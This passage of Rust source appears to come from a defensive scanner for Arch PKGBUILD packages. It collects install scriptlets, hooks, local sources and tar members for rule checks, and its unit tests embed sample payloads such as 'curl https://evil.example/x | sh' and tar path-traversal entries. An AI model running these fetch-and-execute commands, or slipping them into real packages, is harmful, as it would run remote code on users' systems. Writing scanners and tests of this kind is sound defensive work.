        seen: HashSet::new(),
        budget: MAX_TOTAL_BYTES,
        started: std::time::Instant::now(),
        timed_out: false,
        protected: HashSet::new(),
    };
    let mut out = PackageFiles::default();

    // Directory listing, without following symlinks.
    let mut entries: Vec<(String, PathBuf, std::fs::FileType)> = Vec::new();
    match std::fs::read_dir(dir) {
        Ok(rd) => {
            for e in rd.flatten() {
                if let Ok(ft) = std::fs::symlink_metadata(e.path()).map(|m| m.file_type()) {
                    entries.push((e.file_name().to_string_lossy().into_owned(), e.path(), ft));
                }
            }
        }
        Err(e) => c.findings.push(unanalyzable_finding(
            dir,
            &format!("package directory could not be listed: {e}"),
        )),
    }
    entries.sort_by(|a, b| a.0.cmp(&b.0));

    let mut installs: Vec<ParsedInstallScript> = Vec::new();

    // 1. Declared install= values, found anywhere in the PKGBUILD text (global,
    //    per split package, inside functions, behind `declare`, `&&`, `eval`).
    let lines = lex_lines(&pkg.raw_content);
    let census = build_census(&lines);
    let mut decls = find_install_decls(&lines);
    for v in pkg.installs.iter().chain(pkg.install.iter()) {
        let known = decls
            .iter()
            .any(|d| d.value.trim_matches(['"', '\'']) == v.trim_matches(['"', '\'']));
        if !known && (decls.is_empty() || !v.contains(['$', '{', '`', '('])) {
            decls.push(InstallDecl {
                value: v.clone(),
                pkgname: None,
                speculative: false,
            });
        }
    }
    // The same values under every package name makepkg could be using for them:
    // each pkgname, pkgbase, and each `package_*` suffix. Which function a line
    // sits in is a lexer guess; this way a file that any reading names is typed
    // as a scriptlet.
    {
        lazy_static::lazy_static! {
            static ref PKG_FN: regex::Regex =
                regex::Regex::new(r"package_([A-Za-z0-9_.+@-]+)\s*\(").unwrap();
        }
        let mut cand: Vec<String> = Vec::new();
        let mut add = |v: String| {
            if !v.is_empty() && !v.contains(['$', '`', WILDCARD]) && !cand.contains(&v) {
                cand.push(v);
            }
        };
        for n in &pkg.pkgname {
            add(expand_vars(n, pkg).text);
        }
        if let Some(b) = pkg.variables.get("pkgbase") {
            add(expand_vars(b, pkg).text);
        }
        for c in PKG_FN.captures_iter(&pkg.raw_content) {
            add(c[1].to_string());
        }
        cand.truncate(64);
        let base: Vec<InstallDecl> = decls.clone();
        for d in &base {
            for n in &cand {
                let spec = InstallDecl {
                    value: d.value.clone(),
                    pkgname: Some(n.clone()),
                    speculative: true,
                };
                if !decls
                    .iter()
                    .any(|x| x.value == spec.value && x.pkgname == spec.pkgname)
                {
                    decls.push(spec);
                }
            }
        }
        decls.truncate(4096);
    }
    // Every install= name that resolves, so a tar member of that name is typed
    // as a scriptlet.
    let install_names: Vec<String> = decls
        .iter()
        .filter_map(|d| {
            let ctx = Ctx {
                pkgname: d.pkgname.as_deref(),
                census: Some(&census),
                work: None,
            };
            let e = expand_with(&d.value, pkg, &ctx);
            (e.complete && !e.text.contains(['$', '`']) && !e.text.is_empty()).then_some(e.text)
        })
        .collect();
    // Words on PKGBUILD lines that assign `install` (`install=`, `install+=`,
    // `install[`): a crude textual cue for which file is the scriptlet when
    // nothing can be resolved. The coreutils `install -Dm755 file ...` command
    // is not an assignment and does not count.
    let mentioned: HashSet<String> = pkg
        .raw_content
        .lines()
        .filter(|l| {
            l.match_indices("install").any(|(i, _)| {
                let after = &l[i + 7..];
                let before_ok = i == 0 || !l.as_bytes()[i - 1].is_ascii_alphanumeric();
                before_ok
                    && (after.starts_with('=') || after.starts_with("+=") || after.starts_with('['))
            })
        })
        .flat_map(|l| {
            l.split(|c: char| {
                !(c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '+' | '@' | '-'))
            })
            .filter(|w| w.len() >= 2)
            .map(str::to_string)
            .collect::<Vec<_>>()
        })
        .collect();
    c.protected = install_names
        .iter()
        .map(|n| n.rsplit('/').next().unwrap_or(n).to_string())
        .chain(mentioned.iter().cloned())
        .collect();
    let mut unresolved: Vec<String> = Vec::new();
    // The model of makepkg's evaluation only holds when `install` is only ever
    // assigned plainly and nothing opaque (`eval "$x"`, `source f`) can set it.
    if census.exotic_pkg.contains("install") {
        unresolved.push("install modified by += / [i]= / read / printf -v".to_string());
    }
    if census.dynamic {
        unresolved.push("eval of an expansion, or source of another file".to_string());
    }
    for d in &decls {
        let ctx = Ctx {
            pkgname: d.pkgname.as_deref(),
            census: Some(&census),
            work: None,
        };
        let ex = expand_with(&d.value, pkg, &ctx);
        if !ex.complete || ex.text.contains(['$', '`']) {
            if d.speculative {
                continue;
            }
            // Unresolvable name: read every file the pattern could name as a
            // scriptlet, and below treat every sidecar as one.
            debug!("install= value {:?} not statically resolvable", d.value);
            unresolved.push(d.value.clone());
            let pat: Vec<char> = ex.text.chars().collect();
            if !pat.iter().all(|&ch| ch == WILDCARD) {
                for (name, path, ft) in &entries {
                    if ft.is_file() && wildcard_match(&pat, &name.chars().collect::<Vec<_>>()) {
                        if let Some(s) = c.load(path, FileType::InstallScript) {
                            installs.push(s);
                        }
                    }
                }
            }
            continue;
        }
        if ex.text.is_empty() {
            continue;
        }
        if d.speculative {
            if let Ok(p) = safe_join(dir, &ex.text) {
                if std::fs::symlink_metadata(&p).is_ok_and(|m| m.is_file()) {
                    if let Some(m) = c.take_archive(&p, &install_names) {
                        installs.extend(m);
                    } else if let Some(s) = c.load(&p, FileType::InstallScript) {
                        installs.push(s);
                    }
                }
            }
            continue;
        }
        match safe_join(dir, &ex.text) {
            Ok(p) => match std::fs::symlink_metadata(&p) {
                Err(_) => c.findings.push(unanalyzable_finding(
                    &p,
                    "is declared by install= but does not exist; makepkg would refuse it, and the declared scriptlet could not be reviewed",
                )),
                Ok(m) if m.is_dir() => c.findings.push(unanalyzable_finding(
                    &p,
                    "is declared by install= but is a directory, not a scriptlet; makepkg would refuse it, and the declared scriptlet could not be reviewed",
                )),
                Ok(_) => {
                    if let Some(m) = c.take_archive(&p, &install_names) {
                        installs.extend(m);
                        continue;
                    }
                    if let Some(s) = c.load(&p, FileType::InstallScript) {
                        installs.push(s);
                    }
                }
            },
            Err(reason) => c.findings.push(unanalyzable_finding(
                &dir.join(&ex.text),
                &format!("is declared by install= but {reason}"),
            )),
        }
    }

    // 2. Every `*.install` in the directory, declared or not. makepkg only
    //    honours the declared one, but reading them all means a split package's
    //    per-package scriptlet or a decoy cannot hide a payload.
    for (name, path, _) in &entries {
        let ext_install = Path::new(name).extension().and_then(|e| e.to_str()) == Some("install");
        if !ext_install {
            continue;
        }
        if let Some(s) = c.load(path, FileType::InstallScript) {
            installs.push(s);
        }
    }

    // 3. ALPM hooks.
    for (name, path, _) in &entries {
        if Path::new(name).extension().and_then(|e| e.to_str()) == Some("hook") {
            if let Some(s) = c.load(path, FileType::InstallScript) {
                out.side.push(s);
            }
        }
    }

    // 4. Local source=() entries, by makepkg's own naming rules.
    for entry in &pkg.source {
        if entry.protocol.is_remote() {
            continue;
        }
        let Some(ex) = local_source_name(entry, pkg) else {
            continue;
        };
        if ex.complete {
            if !is_plain_name(&ex.text) {
                debug!(
                    "not reading local source {:?}: not a plain filename",
                    ex.text
                );
                continue;
            }
            let p = dir.join(&ex.text);
            if Collector::exists(&p) {
                if let Some(m) = c.take_archive(&p, &install_names) {
                    out.side.extend(m);
                    continue;
                }
                if let Some(s) = c.load(&p, FileType::SourceFile) {
                    out.side.push(s);
                }
            }
        } else {
            // Partly unresolvable (`${pkgver//./_}.patch`): read every file in
            // the directory the pattern could name.
            let pat: Vec<char> = ex.text.chars().collect();
            if pat.iter().all(|&ch| ch == WILDCARD) {
                // Nothing to anchor on; matching everything would just re-read
                // the whole directory as "sources".
                continue;
            }
            for (name, path, ft) in &entries {
                if ft.is_dir() || IGNORED_NAMES.contains(&name.as_str()) {
                    continue;
                }
                let n: Vec<char> = name.chars().collect();
                if wildcard_match(&pat, &n) {
                    if ft.is_file() {
                        if let Some(m) = c.take_archive(path, &install_names) {
                            out.side.extend(m);
                            continue;
                        }
                    }
                    if let Some(s) = c.load(path, FileType::SourceFile) {
                        out.side.push(s);
                    }
                }
            }
        }
    }

    // 5. The whole package tree. makepkg can reach any file below the package
    //    directory (`$startdir/sub/x`, `cd sub`, a tar that unpacks into it), a
    //    name or extension says nothing about what a shell will do with the
    //    content, and the file it ships as .INSTALL sits somewhere in it, so
    //    every file is read, dotfiles and subdirectories included, within bounds.
    //    Links, FIFOs and the like are never opened; they are reported when a
    //    script-like name or the package's own text points at them.
    let mut all_text = pkg.raw_content.clone();
    for s in installs.iter().chain(out.side.iter()) {
        all_text.push('\n');
        all_text.push_str(&s.content);
    }
    let tree = walk_tree(dir, &mut c);
    for (name, path, ft) in &tree {
        if c.out_of_time(path) {
            break;
        }
        let top_level = path.parent() == Some(dir);
        if (top_level && NEVER_SCANNED.contains(&name.as_str())) || c.seen.contains(path) {
            continue;
        }
        if !ft.is_file() {
            if is_script_name(name) || all_text.contains(name.as_str()) {
                if let Some(s) = c.load(path, FileType::SourceFile) {
                    out.side.push(s);
                }
            }
            continue;
        }
        if let Some(m) = c.take_archive(path, &install_names) {
            out.side.extend(m);
            continue;
        }
        if let Some(s) = c.load(path, FileType::SourceFile) {
            out.side.push(s);
        }
    }

    // An install= that cannot be resolved statically leaves makepkg free to run
    // any file in the directory as the scriptlet. Type every sidecar as one so
    // the scriptlet rules (ATOMIC-002, INSTALL-001..004, PERSIST-001, ENV-002)
    // run over it, and say so.
    if !unresolved.is_empty() {
        for s in out.side.iter_mut() {
            if s.file_type == FileType::SourceFile {
                s.file_type = FileType::InstallScript;
            }
        }
        c.findings
            .push(unresolved_install_finding(dir, &unresolved));
    }

    // Scriptlet typing does not depend on resolving `install=`: makepkg can only
    // ship as .INSTALL a file that sits in this tree, and a scriptlet is only
    // useful if it defines the functions pacman calls. Any file that does (or
    // that `install=` resolves to) is ALSO scanned as an install scriptlet, in
    // addition to the type it has today, so the scriptlet rules (ATOMIC-002,
    // INSTALL-001..004, PERSIST-001, ENV-002 and the rest) run over it. The two
    // copies are told apart by file type; the scan result drops duplicate
    // findings.
    let mut typed: Vec<ParsedInstallScript> = Vec::with_capacity(out.side.len() * 2);
    for s in out.side.drain(..) {
        let also_install =
            s.file_type == FileType::SourceFile && also_scriptlet(&s, &install_names, &mentioned);
        if also_install {
            let mut copy = s.clone();
            copy.file_type = FileType::InstallScript;
            typed.push(s);
            typed.push(copy);
        } else {
            typed.push(s);
        }
    }
    out.side = typed;

    // The first install scriptlet is the primary one; the rest are side scripts.
    let mut it = installs.into_iter();
    out.install = it.next();
    out.side.splice(0..0, it);
    out.findings = c.findings;
    out
}

/// Whether a sidecar is also scanned as an install scriptlet: it is a resolved
/// `install=` name (under any package name), it is named `*.install` or appears
/// on a PKGBUILD line that mentions `install`, or it defines the functions pacman calls from a scriptlet
/// (`pre_`/`post_` `install`/`upgrade`/`remove`). A file that defines none of
/// them cannot do anything at install time, so build helpers, changelogs and CI
/// files stay typed as sources only. Quotes and backslashes are dropped before
/// looking, so `post_"install"() {` is still found.
fn also_scriptlet(
    s: &ParsedInstallScript,
    install_names: &[String],
    mentioned: &HashSet<String>,
) -> bool {
    lazy_static::lazy_static! {
        static ref SCRIPTLET_FN: regex::Regex = regex::Regex::new(
            r#"(?m)(?:^|[;&{(]|\bfunction)\s*(?:pre|post)_(?:install|upgrade|remove)\s*(?:\(\s*\))?\s*\{"#
        ).unwrap();
    }
    let base = s
        .path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    if base.to_ascii_lowercase().ends_with(".install") || mentioned.contains(&base) {
        return true;
    }
    if install_names
        .iter()
        .any(|n| *n == base || s.path.ends_with(n))
    {
        return true;
    }
    let plain: String = s
        .content
        .chars()
        .filter(|c| !matches!(c, '"' | '\'' | '\\'))
        .collect();
    SCRIPTLET_FN.is_match(&plain)
}

/// A directory with the shape of a git repository (`HEAD` and `objects/`).
fn looks_like_git_repo(p: &Path) -> bool {
    std::fs::symlink_metadata(p.join("HEAD")).is_ok_and(|m| m.is_file())
        && std::fs::symlink_metadata(p.join("objects")).is_ok_and(|m| m.is_dir())
}

/// Every file below `dir`, bounded in depth, count and time; `.git` is skipped
/// and symlinks are never followed. Hitting a bound is a Critical `SCAN-001`:
/// a tree that cannot be read in full cannot be reported clean.
fn walk_tree(dir: &Path, c: &mut Collector) -> Vec<(String, PathBuf, std::fs::FileType)> {
    let mut out = Vec::new();
    let mut stack: Vec<(PathBuf, usize)> = vec![(dir.to_path_buf(), 0)];
    let mut bound: Option<&str> = None;
    'walk: while let Some((d, depth)) = stack.pop() {
        if c.out_of_time(&d) {
            return out;
        }
        let Ok(rd) = std::fs::read_dir(&d) else {
            if depth == 0 {
                continue;
            }
            c.findings
                .push(unanalyzable_finding(&d, "could not be listed"));
            continue;
        };
        let mut ents: Vec<(String, PathBuf, std::fs::FileType)> = Vec::new();
        for e in rd.flatten() {
            if let Ok(ft) = std::fs::symlink_metadata(e.path()).map(|m| m.file_type()) {
                ents.push((e.file_name().to_string_lossy().into_owned(), e.path(), ft));
            }
        }
        ents.sort_by(|a, b| a.0.cmp(&b.0));
        for (name, path, ft) in ents {
            if ft.is_dir() {
                // Skip only a real repository at the top level; a nested `.git`
                // or a fake one is package content.
                if name == ".git" && depth == 0 && looks_like_git_repo(&path) {
                    continue;
                }
                if depth + 1 > MAX_TREE_DEPTH {
                    bound = Some("is nested deeper than the scan depth limit");
                    break 'walk;
                }
                stack.push((path, depth + 1));
            } else {
                if out.len() >= MAX_TREE_FILES {
                    bound = Some("holds more files than the scan file limit");
                    break 'walk;
                }
                out.push((name, path, ft));
            }
        }
    }
    if let Some(why) = bound {
        c.findings.push(unanalyzable_finding(
            dir,
            &format!(
                "package tree too large to review fully: it {why}, so files past the limit \
                 were not analyzed"
            ),
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn pkg(text: &str) -> ParsedPkgbuild {
        use crate::parser::PkgbuildParser;
        parser::StaticParser::new().parse(text).unwrap()
    }

    #[test]
    fn expands_simple_and_nested_vars() {
        let p = pkg("pkgname=foo\npkgver=1.2\npkgrel=1\n_base=bar-$pkgver\n");
        assert_eq!(
            expand_vars("${pkgname}-helper.sh", &p).text,
            "foo-helper.sh"
        );
        assert_eq!(expand_vars("$_base.patch", &p).text, "bar-1.2.patch");
        let e = expand_vars("${pkgver//./_}.patch", &p);
        assert!(e.complete);
        assert_eq!(e.text, "1_2.patch");
        let e = expand_vars("${pkgver//[0-9]/x}.patch", &p);
        assert!(!e.complete);
        assert!(e.text.contains(WILDCARD));
    }

    #[test]
    fn wildcard_matches_unresolved_segment() {
        let pat: Vec<char> = format!("v{WILDCARD}.patch").chars().collect();
        assert!(wildcard_match(
            &pat,
            &"v1_2.patch".chars().collect::<Vec<_>>()
        ));
        assert!(!wildcard_match(
            &pat,
            &"v1_2.txt".chars().collect::<Vec<_>>()
        ));
    }

    #[test]
    fn safe_join_rejects_escapes() {
        let d = tempfile::tempdir().unwrap();
        assert!(safe_join(d.path(), "../x").is_err());
        assert!(safe_join(d.path(), "/etc/passwd").is_err());
        assert!(safe_join(d.path(), "a.install").is_ok());
    }

    fn decl_values(text: &str) -> Vec<(String, Option<String>)> {
        let p = pkg(text);
        find_install_decls(&lex_lines(&p.raw_content))
            .into_iter()
            .map(|d| (d.value, d.pkgname))
            .collect()
    }

    #[test]
    fn finds_install_behind_declare_conditional_and_eval() {
        for body in [
            "declare install=demo.scr",
            "readonly -- install=demo.scr",
            "[[ -n 1 ]] && install=demo.scr",
            "eval \"install=demo.scr\"",
            "if true; then install=demo.scr; fi",
        ] {
            let v = decl_values(&format!("pkgname=d\npkgver=1\npkgrel=1\n{body}\n"));
            assert_eq!(v.len(), 1, "{body}: {v:?}");
            assert_eq!(v[0].0, "demo.scr", "{body}");
        }
    }

    #[test]
    fn install_like_text_is_not_a_declaration() {
        let v = decl_values(
            "pkgname=d\npkgver=1\npkgrel=1\n# install=x.scr\nnoinstall=1\n\
             build() { make install=1; ./configure --install=/usr; }\n",
        );
        assert!(v.is_empty(), "{v:?}");
    }

    #[test]
    fn package_function_sets_its_own_pkgname() {
        let text = "pkgbase=demo\npkgname=(demo demo-extras)\npkgver=1\npkgrel=1\n\
                    package_demo() {\n  install=\"$pkgname.scr\"\n}\n\
                    package_demo-extras() {\n  install=\"$pkgname.scr\"\n}\n";
        let p = pkg(text);
        let decls = find_install_decls(&lex_lines(&p.raw_content));
        let names: Vec<String> = decls
            .iter()
            .map(|d| {
                let ctx = Ctx {
                    pkgname: d.pkgname.as_deref(),
                    ..Ctx::default()
                };
                expand_with(&d.value, &p, &ctx).text
            })
            .collect();
        assert_eq!(names, ["demo.scr", "demo-extras.scr"]);
    }

    #[test]
    fn expands_common_parameter_operators() {
        let p = pkg("pkgname=(demo-git demo)\npkgver=1\npkgrel=1\n_n=DEMO\n");
        for (src, want) in [
            ("${pkgname%-git}.scr", "demo.scr"),
            ("${pkgname#demo-}.scr", "git.scr"),
            ("${_n,,}.scr", "demo.scr"),
            ("${_n^^}.scr", "DEMO.scr"),
            ("${_unset:-demo}.scr", "demo.scr"),
            ("${pkgname[1]}.scr", "demo.scr"),
            ("$(echo demo).scr", "demo.scr"),
            ("${_n:1:2}.scr", "EM.scr"),
        ] {
            let e = expand_vars(src, &p);
            assert!(e.complete, "{src}");
            assert_eq!(e.text, want, "{src}");
        }
        // Unknown operators, unset-without-default and set-elsewhere stay unresolved.
        assert!(!expand_vars("${pkgname@U}.scr", &p).complete);
        assert!(!expand_vars("$(curl evil.example).scr", &p).complete);
        assert!(!expand_vars("${_gone}.scr", &p).complete);
        let q = pkg("pkgname=d\npkgver=1\npkgrel=1\nf() { _x=other; }\n");
        assert!(!expand_vars("${_x:-demo}.scr", &q).complete);
    }

    #[test]
    fn unresolved_install_types_every_sidecar_as_scriptlet() {
        let d = tempfile::tempdir().unwrap();
        std::fs::write(
            d.path().join("PKGBUILD"),
            "pkgname=d\npkgver=1\npkgrel=1\ninstall=\"$(uname).scr\"\n",
        )
        .unwrap();
        std::fs::write(d.path().join("helper"), "post_install() { :; }\n").unwrap();
        let p = pkg(&std::fs::read_to_string(d.path().join("PKGBUILD")).unwrap());
        let f = collect(d.path(), &p);
        assert!(f
            .findings
            .iter()
            .any(|x| x.id == "META-007" && x.severity == Severity::High));
        assert!(f
            .side
            .iter()
            .all(|s| s.file_type == FileType::InstallScript));
    }

    #[test]
    fn resolved_install_raises_no_meta005_and_keeps_source_type() {
        let d = tempfile::tempdir().unwrap();
        let text = "pkgname=d\npkgver=1\npkgrel=1\ninstall=${pkgname}.install\n";
        std::fs::write(d.path().join("PKGBUILD"), text).unwrap();
        std::fs::write(d.path().join("d.install"), "post_install() { :; }\n").unwrap();
        std::fs::write(d.path().join("notes"), "hello\n").unwrap();
        let f = collect(d.path(), &pkg(text));
        assert!(f.findings.is_empty(), "{:?}", f.findings);
        // A file that defines no scriptlet function stays a source only.
        assert!(f.side.iter().any(|s| s.file_type == FileType::SourceFile));
        assert!(!f
            .side
            .iter()
            .any(|s| { s.file_type == FileType::InstallScript && s.path.ends_with("notes") }));
    }

    fn tar_bytes(members: &[(&str, &[u8])]) -> Vec<u8> {
        let mut out = Vec::new();
        for (name, body) in members {
            let mut h = [0u8; 512];
            h[..name.len()].copy_from_slice(name.as_bytes());
            h[100..107].copy_from_slice(b"0000644");
            h[124..135].copy_from_slice(format!("{:011o}", body.len()).as_bytes());
            h[156] = b'0';
            h[257..265].copy_from_slice(b"ustar\x0000");
            h[148..156].copy_from_slice(b"        ");
            let sum: u32 = h.iter().map(|&c| u32::from(c)).sum();
            h[148..155].copy_from_slice(format!("{sum:06o}\0").as_bytes());
            out.extend_from_slice(&h);
            out.extend_from_slice(body);
            out.resize(out.len().div_ceil(512) * 512, 0);
        }
        out.resize(out.len() + 1024, 0);
        out
    }

    fn collect_with(files: &[(&str, &[u8])], pkgbuild: &str) -> (PackageFiles, tempfile::TempDir) {
        let d = tempfile::tempdir().unwrap();
        std::fs::write(d.path().join("PKGBUILD"), pkgbuild).unwrap();
        for (n, b) in files {
            std::fs::write(d.path().join(n), b).unwrap();
        }
        (collect(d.path(), &pkg(pkgbuild)), d)
    }

    #[test]
    fn compressed_local_archive_is_scan002_medium_not_scan001() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(a.sh.gz b.sh)\n";
        let (f, _d) = collect_with(
            &[
                ("a.sh.gz", &[0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3]),
                ("b.sh", b"echo hi\n"),
            ],
            text,
        );
        assert!(f.findings.iter().all(|x| x.id != UNANALYZABLE_CODE));
        let hits: Vec<_> = f
            .findings
            .iter()
            .filter(|x| x.id == OPAQUE_ARCHIVE_CODE)
            .collect();
        assert_eq!(hits.len(), 1, "{:?}", f.findings);
        assert_eq!(hits[0].severity, Severity::Medium);
        assert!(hits[0].location.file.ends_with("a.sh.gz"));
    }

    #[test]
    fn plain_tar_members_are_scanned_in_memory() {
        let tar = tar_bytes(&[
            ("helper.sh", b"curl https://evil.example/x | sh\n"),
            ("blob.bin", &[0u8, 1, 2, 0, 0, 3, 0, 0, 0, 0]),
        ]);
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(a.tar)\n";
        let (f, _d) = collect_with(&[("a.tar", &tar)], text);
        // The binary member is scanned too, and said to be not plain text.
        assert_eq!(f.findings.len(), 1, "{:?}", f.findings);
        assert_eq!(f.findings[0].id, OPAQUE_ARCHIVE_CODE);
        let helper = f
            .side
            .iter()
            .find(|s| s.path.ends_with("a.tar:helper.sh") && s.file_type == FileType::SourceFile)
            .unwrap();
        assert!(helper.content.contains("evil.example"));
        assert!(f.side.iter().any(|s| s.path.ends_with("a.tar:blob.bin")));
    }

    #[test]
    fn tar_member_named_like_install_is_an_install_script() {
        let tar = tar_bytes(&[("demo.scr", b"post_install() { :; }\n")]);
        let text = "pkgname=d\npkgver=1\npkgrel=1\ninstall=demo.scr\nsource=(a.tar)\n";
        let (f, _d) = collect_with(&[("a.tar", &tar)], text);
        let m = f
            .side
            .iter()
            .find(|s| s.path.ends_with("a.tar:demo.scr"))
            .unwrap();
        assert_eq!(m.file_type, FileType::InstallScript);
    }

    #[test]
    fn tar_path_traversal_is_scan003_high() {
        let tar = tar_bytes(&[("../../escape.sh", b"echo x\n"), ("ok.txt", b"hi\n")]);
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(a.tar)\n";
        let (f, _d) = collect_with(&[("a.tar", &tar)], text);
        let hit = f.findings.iter().find(|x| x.id == TAR_ESCAPE_CODE).unwrap();
        assert_eq!(hit.severity, Severity::High);
        let tar = tar_bytes(&[("/etc/cron.d/x", b"x\n")]);
        let (f, _d) = collect_with(&[("a.tar", &tar)], text);
        assert!(f.findings.iter().any(|x| x.id == TAR_ESCAPE_CODE));
    }

    #[test]
    fn malformed_or_oversized_tar_falls_back_to_opaque() {
        let mut tar = tar_bytes(&[("a.txt", b"hello\n")]);
        tar[10] ^= 0x55; // breaks the header checksum
        let text = "pkgname=d\npkgver=1\npkgrel=1\nsource=(a.tar)\n";
        let (f, _d) = collect_with(&[("a.tar", &tar)], text);
        // A corrupt header no longer looks like a tar at all; it must not vanish
        // silently, so it is either opaque or read as text, never clean-and-gone.
        assert!(
            f.findings
                .iter()
                .any(|x| x.id == OPAQUE_ARCHIVE_CODE || x.id == TAR_ODD_CODE)
                || !f.side.is_empty()
        );
        // Truncated body.
        let mut t2 = tar_bytes(&[("a.txt", &[b'x'; 2000])]);
        t2.truncate(700);
        let p = parse_tar(&t2).unwrap();
        assert!(!p.oddities.is_empty());
    }

    #[test]
    fn chained_variable_install_resolves() {
        let d = tempfile::tempdir().unwrap();
        for (text, file) in [
            (
                "_pkgname='rustdesk'\npkgname=\"${_pkgname}\"\npkgver=1\npkgrel=1\ninstall=\"${pkgname}.install\"\n",
                "rustdesk.install",
            ),
            (
                "pkgname=python-fangfrisch\n_pkgname=${pkgname#python-}\npkgver=1\npkgrel=1\ninstall=\"${_pkgname}.install\"\n",
                "fangfrisch.install",
            ),
        ] {
            let (f, _d) = collect_with(&[(file, b"post_install() { :; }\n")], text);
            assert!(f.findings.is_empty(), "{text}: {:?}", f.findings);
            assert!(f.install.is_some());
        }
        drop(d);
    }

    #[test]
    fn unresolvable_install_is_meta007_never_a_literal_scan001() {
        let text = "pkgname=d\npkgver=1\npkgrel=1\ninstall=\"${_nope}.install\"\n";
        let (f, _d) = collect_with(&[], text);
        assert!(f.findings.iter().any(|x| x.id == "META-007"));
        assert!(
            f.findings.iter().all(|x| x.id != UNANALYZABLE_CODE),
            "{:?}",
            f.findings
        );
    }

    #[test]
    fn archive_magic_detection() {
        let d = tempfile::tempdir().unwrap();
        let w = |n: &str, b: &[u8]| {
            std::fs::write(d.path().join(n), b).unwrap();
            archive_kind(&d.path().join(n))
        };
        assert_eq!(w("a", &[0xfd, b'7', b'z', b'X', b'Z', 0]), Some("xz"));
        assert_eq!(w("b", b"BZh9xxxx"), Some("bzip2"));
        assert_eq!(w("c", &[0x28, 0xb5, 0x2f, 0xfd, 0]), Some("zstd"));
        assert_eq!(w("d", b"PK\x03\x04rest"), Some("zip"));
        let mut tar = vec![0u8; 257];
        tar.extend_from_slice(b"ustar\0");
        assert_eq!(w("e", &tar), Some("tar"));
        assert_eq!(w("f", b"#!/bin/sh\necho\n"), None);
        assert_eq!(w("g", b""), None);
    }

    fn meta7(f: &PackageFiles) -> bool {
        f.findings
            .iter()
            .any(|x| x.id == "META-007" && x.severity == Severity::High)
    }

    #[test]
    fn install_through_a_reassigned_variable_is_unresolved() {
        for text in [
            "pkgname=demo\npkgver=1\npkgrel=1\n_n=demo\ntrue && _n=evilpkg\ninstall=$_n.scr\n",
            "pkgname=demo\npkgver=1\npkgrel=1\n_n=demo\npackage() {\n  _n=evilpkg\n  install=$_n.scr\n}\n",
            "pkgname=demo\npkgver=1\npkgrel=1\n_n=demo\n_n+=x\ninstall=$_n.scr\n",
            "pkgname=demo\npkgver=1\npkgrel=1\n_n=demo\nread _n < /dev/null\ninstall=$_n.scr\n",
            "pkgname=demo\npkgver=1\npkgrel=1\n_n=demo\nprintf -v _n %s evil\ninstall=$_n.scr\n",
            "pkgname=demo\npkgver=1\npkgrel=1\n_n=(a b)\n_n[1]=evil\ninstall=${_n[1]}.scr\n",
        ] {
            let (f, _d) = collect_with(
                &[("demo.scr", b"post_install() { :; }\n"), ("evilpkg.scr", b"post_install() { :; }\n")],
                text,
            );
            assert!(meta7(&f), "{text}: {:?}", f.findings);
            assert!(f.side.iter().chain(f.install.iter()).any(|s| s.file_type == FileType::InstallScript));
        }
        // The same shape written once stays resolved.
        let ok = "pkgname=demo\npkgver=1\npkgrel=1\n_n=demo\ninstall=$_n.scr\n";
        let (f, _d) = collect_with(&[("demo.scr", b"post_install() { :; }\n")], ok);
        assert!(f.findings.is_empty(), "{:?}", f.findings);
    }

    #[test]
    fn install_plus_equals_and_dynamic_code_are_unresolved() {
        for text in [
            "pkgname=demo\npkgver=1\npkgrel=1\ninstall=demo\ninstall+=.scr\n",
            "pkgname=demo\npkgver=1\npkgrel=1\ninstall=demo.scr\neval \"$(cat x)\"\n",
            "pkgname=demo\npkgver=1\npkgrel=1\ninstall=demo.scr\nsource other.sh\n",
        ] {
            let (f, _d) = collect_with(&[("demo.scr", b"post_install() { :; }\n")], text);
            assert!(meta7(&f), "{text}: {:?}", f.findings);
        }
    }

    #[test]
    fn braces_in_quotes_do_not_end_a_function_early() {
        let text = "pkgbase=demo\npkgname=(demo demo-b)\npkgver=1\npkgrel=1\n\
                    package_demo() { :; }\npackage_demo-b() {\n  echo \"}\"\n  # }\n  \
                    cat <<EOF\n}\nEOF\n  install=$pkgname.scr\n}\n";
        let p = pkg(text);
        let decls = find_install_decls(&lex_lines(&p.raw_content));
        assert_eq!(decls.len(), 1, "{decls:?}");
        assert_eq!(decls[0].pkgname.as_deref(), Some("demo-b"));
    }

    #[test]
    fn expansion_work_is_bounded() {
        let a = "$_a".repeat(40);
        let text = format!("pkgname=demo\npkgver=1\npkgrel=1\n_a=\"{a}\"\ninstall=\"$_a.scr\"\n");
        let t = std::time::Instant::now();
        let (f, _d) = collect_with(&[], &text);
        assert!(t.elapsed().as_secs() < 5, "expansion must not blow up");
        assert!(meta7(&f));
    }

    #[test]
    fn glob_operators_do_not_backtrack_exponentially() {
        let x = "a".repeat(60);
        let text = format!(
            "pkgname=demo\npkgver=1\npkgrel=1\n_x={x}\ninstall=\"${{_x%%*a*a*a*a*a*a*a*a*a*a*a*a*a*a*b}}.scr\"\n"
        );
        let t = std::time::Instant::now();
        let p = pkg(&text);
        let _ = expand_vars("${_x%%*a*a*a*a*a*a*a*a*a*a*a*a*a*a*b}", &p);
        let pat: Vec<char> = "*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*b".chars().collect();
        let s: Vec<char> = x.chars().collect();
        assert!(!glob_match(&pat, &s));
        assert!(glob_match(&['*', 'a'], &s));
        let (_f, _d) = collect_with(&[], &text);
        assert!(t.elapsed().as_secs() < 5);
    }

    fn retar_sum(t: &mut [u8], at: usize, signed: bool) {
        t[at + 148..at + 156].copy_from_slice(b"        ");
        let sum: i64 = t[at..at + 512]
            .iter()
            .map(|&c| {
                if signed {
                    i64::from(c as i8)
                } else {
                    i64::from(c)
                }
            })
            .sum();
        t[at + 148..at + 156].copy_from_slice(format!("{sum:06o}\0 ").as_bytes());
    }

    fn tar_with_flag(flag: u8, body: &[u8]) -> Vec<u8> {
        let mut t = tar_bytes(&[("build.sh", body)]);
        t[156] = flag;
        retar_sum(&mut t, 0, false);
        t
    }

    const PAYLOAD: &[u8] = b"curl -s https://evil.example/x | sh\n";

    fn has_odd(p: &TarParsed, what: &str) -> bool {
        p.oddities.iter().any(|o| o.contains(what))
    }

    #[test]
